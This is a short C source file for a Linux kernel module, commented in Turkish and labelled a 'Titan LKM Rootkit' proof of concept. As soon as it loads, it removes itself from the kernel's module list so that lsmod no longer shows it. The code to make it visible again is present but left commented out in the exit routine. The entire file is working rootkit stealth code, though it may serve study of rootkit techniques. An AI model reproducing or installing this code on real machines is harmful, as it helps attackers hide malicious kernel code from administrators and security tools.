#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>

// Lisans belirtmek zorunludur (GPL) yoksa kernel "tainted" (lekelenmiş) uyarısı verir.
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ege");
MODULE_DESCRIPTION("Titan LKM Rootkit - Hide Module PoC");
MODULE_VERSION("1.0");

// Kernel modül yapısına erişim için
static struct list_head *prev_module;

void hide_module(void) {
    // THIS_MODULE makrosu, şu anki modülün yapısını verir.
    // list.prev ile bir önceki modülün adresini saklıyoruz (Geri getirmek istersek diye)
    prev_module = THIS_MODULE->list.prev;
    
    // Kritik Hamle: Modülü listeden sil (Linked List Unlinking)
    // Bu işlem modülü hafızadan silmez, sadece "listeden" çıkarır.
    list_del(&THIS_MODULE->list);
    
    printk(KERN_INFO "Titan: Modül listeden gizlendi (lsmod artık beni göremez).\n");
}

void show_module(void) {
    // Modülü tekrar listeye ekle (Unloading yapabilmek için gerekli)
    list_add(&THIS_MODULE->list, prev_module);
    printk(KERN_INFO "Titan: Modül tekrar görünür yapıldı.\n");
}

static int __init titan_init(void) {
    printk(KERN_INFO "Titan: Yüklendi ve karanlığa karışıyor...\n");
    
    // Yüklenir yüklenmez kendini gizle
    hide_module();
    
    return 0;
}

static void __exit titan_exit(void) {
    // Çıkış yapmadan önce sistemi temizle (yoksa rmmod hata verebilir)
    // Gerçek rootkitlerde bu kısım olmaz, modül sonsuza kadar kalır.
    // show_module(); // Normalde gerekirdi ama biz rmmod zorlayacağız.
    printk(KERN_INFO "Titan: Sistemden ayrılıyor.\n");
}

module_init(titan_init);
module_exit(titan_exit);
